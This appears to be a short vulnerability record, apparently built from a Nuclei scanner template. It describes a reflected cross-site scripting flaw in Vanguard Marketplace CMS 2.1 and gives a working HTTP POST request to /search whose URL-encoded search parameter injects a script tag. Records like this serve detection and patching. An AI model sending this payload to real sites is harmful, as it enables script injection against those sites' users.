# Vulnerability: Vanguard Marketplace CMS 2.1 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`vanguard-post-xss.yaml`)

## Description
Vanguard Marketplace CMS 2.1 contains a cross-site scripting vulnerability in the message and product title tags and in the product search box.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /search HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

